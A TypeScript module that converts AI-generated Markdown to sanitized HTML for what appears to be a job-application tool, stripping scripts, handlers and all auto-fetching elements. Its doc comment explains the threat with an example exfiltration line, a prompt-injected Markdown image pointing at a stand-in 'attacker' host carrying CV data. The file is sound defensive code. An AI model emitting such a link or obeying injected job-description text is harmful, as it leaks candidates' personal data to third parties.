import { marked } from "marked";
import sanitizeHtml from "sanitize-html";

/**
 * Allowlist sanitizer (sanitize-html: pure JS, no DOM), so the same code and the same output run
 * in the browser, in Node and on Cloudflare Workers (no jsdom). Hydration needs identical HTML on
 * server and client, which is why one sanitizer is used everywhere.
 *
 * Anything not listed is dropped. In particular:
 * - scripts, styles, frames, forms, inputs, objects/embeds, SVG/MathML;
 * - event handlers and inline `style`;
 * - every element/attribute that makes the browser fetch a URL without a click (img, picture,
 *   source, video, audio, track, srcset, poster, background). Generated Markdown is built from
 *   untrusted JD text plus the candidate profile, so a prompt-injected
 *   `![](https://attacker/?d=<cv data>)` would otherwise exfiltrate data as soon as the package
 *   (or its print/export view) is opened. Generated content never needs images.
 */
const SANITIZE_OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: [
    "p",
    "br",
    "hr",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "strong",
    "b",
    "em",
    "i",
    "u",
    "del",
    "s",
    "mark",
    "small",
    "sub",
    "sup",
    "kbd",
    "abbr",
    "cite",
    "q",
    "code",
    "pre",
    "blockquote",
    "span",
    "div",
    "ul",
    "ol",
    "li",
    "dl",
    "dt",
    "dd",
    "a",
    "table",
    "caption",
    "thead",
    "tbody",
    "tfoot",
    "tr",
    "th",
    "td",
    "colgroup",
    "col",
    "details",
    "summary",
  ],
  allowedAttributes: {
    a: ["href", "title"],
    abbr: ["title"],
    ol: ["start", "type"],
    th: ["align", "colspan", "rowspan", "scope"],
    td: ["align", "colspan", "rowspan"],
    code: ["class"],
    pre: ["class"],
    span: ["class"],
  },
  // Only syntax-highlighting hints survive (e.g. ```ts → class="language-ts").
  allowedClasses: { code: ["language-*"], pre: ["language-*"], span: ["token", "token-*"] },
  allowedSchemes: ["http", "https", "mailto", "tel"],
  allowedSchemesAppliedToAttributes: ["href", "cite"],
  allowProtocolRelative: false,
  // Drop the *content* of dangerous elements too, not just their tags.
  nonTextTags: ["script", "style", "textarea", "option", "noscript", "iframe", "object", "embed", "svg", "math"],
  disallowedTagsMode: "discard",
  parser: { lowerCaseTags: true, lowerCaseAttributeNames: true },
};

/**
 * Converts generated Markdown to sanitized HTML. All AI/seed Markdown must pass
 * through here: generated content is untrusted (it may echo job-description text).
 */
export function renderMarkdown(markdown: string): string {
  const html = marked.parse(markdown, { async: false, gfm: true, breaks: false }) as string;
  return sanitizeHtml(html, SANITIZE_OPTIONS);
}

/** Strips Markdown syntax for plain-text contexts (search, clipboard). */
export function markdownToPlainText(markdown: string): string {
  return markdown
    .replace(/```[\s\S]*?```/g, (block) => block.replace(/```\w*\n?/g, ""))
    .replace(/`([^`]+)`/g, "$1")
    .replace(/!\[[^\]]*\]\([^)]*\)/g, "")
    .replace(/\[([^\]]+)\]\([^)]*\)/g, "$1")
    .replace(/^#{1,6}\s+/gm, "")
    .replace(/(\*\*|__)(.*?)\1/g, "$2")
    .replace(/(\*|_)(.*?)\1/g, "$2")
    .trim();
}
